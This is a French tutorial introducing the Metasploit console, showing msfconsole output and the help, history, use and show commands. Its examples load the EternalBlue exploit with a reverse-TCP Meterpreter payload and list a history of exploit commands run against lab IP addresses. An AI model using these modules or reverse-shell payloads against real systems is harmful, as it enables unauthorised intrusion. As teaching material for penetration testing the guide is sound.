
La **console metasploit** est l'outil avec lequel on va **interragir avec nos modules**, pour la lancé la commande est **`msfconsole`**.

```shell
┌──(azure㉿kali)-[~]
└─$ msfconsole

                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........



       =[ metasploit v6.3.10-dev-                         ]
+ -- --=[ 2303 exploits - 1203 auxiliary - 412 post       ]
+ -- --=[ 965 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go
back to the top level prompt
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

Une fois lancé, vous pouvez interragir avec la console comme si c'était un **shell banal à l'exception de quelques commandes** comme ci-dessous :

```shell
msf6 > help > help.txt 
[-] No such command 
msf6 >
```

On peut utiliser la commande **`help`** afin d'avoir des **informations sur des commandes** :

```shell
msf6 > help set
Usage: set [option] [value]

Set the given option to value. If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore. Use -g to operate on the global datastore. 

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 >
```

On peut utiliser la commande **`history`** pour avoir l'historique des commandes tapées précédemment.

```shell
msf6 > history 
1 use exploit/multi/http/nostromo_code_exec
2 set lhost 10.10.16.17 
3 set rport 80 
4 options 
5 set rhosts 10.10.29.187
6 run 
7 exit 
8 exit -y 
9 version 
10 use exploit/multi/script/web_delivery
```

La commande **`use`** permet d'utiliser un module. 

```shell
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Vous remarquerez qu'on peut toujours utiliser les commandes comme `ls`, cela signifie qu'on est pas entré dans un dossier comme on pourrait croire.

Une commande importante lorsqu'on veut utiliser un module, est **`show options`**, elle nous affiche les options qu'attends le module.

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue): 

	Name          Current Setting Required Description 
	----          --------------- -------- ----------- 
	RHOSTS                        yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
	RPORT         445             yes The target port (TCP)
	SMBDomain     .               no (Optional) The Windows domain to use for authentication
	SMBPass                       no (Optional) The password for the specified username
	SMBUser                       no (Optional) The username to authenticate as 
	VERIFY_ARCH   true            yes Check if remote architecture matches exploit Target.
	VERIFY_TARGET true            yes Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp): 

Name     Current Setting Required Description
----     --------------- -------- ----------- 
EXITFUNC thread          yes      Exit technique (Accepted: '', seh, thread, process, none) 
LHOST    10.10.220.191   yes      The listen address (an interface may be specified) 
LPORT    4444            yes      The listen port

Exploit target: 

	Id Name 
	-- ---- 
	0  Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

La commande **`show`**  peut être utilisé avec tout type de modules :

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

#  Name                                       Disclosure Date Rank   Check Description
-  ----                                       --------------- ----   ----- ----------- 
0  generic/custom                                             manual No Custom Payload
1  generic/shell_bind_tcp                                     manual No Generic Command Shell, Bind TCP Inline
2  generic/shell_reverse_tcp                                  manual No Generic Command Shell, Reverse TCP Inline 
3  windows/x64/exec                                           manual No Windows x64 Execute Command 
4  windows/x64/loadlibrary                                    manual No Windows x64 LoadLibrary Path
5  windows/x64/messagebox                                     manual No Windows MessageBox x64 
6  windows/x64/meterpreter/bind_ipv6_tcp                      manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
7  windows/x64/meterpreter/bind_ipv6_tcp_uuid                 manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
```

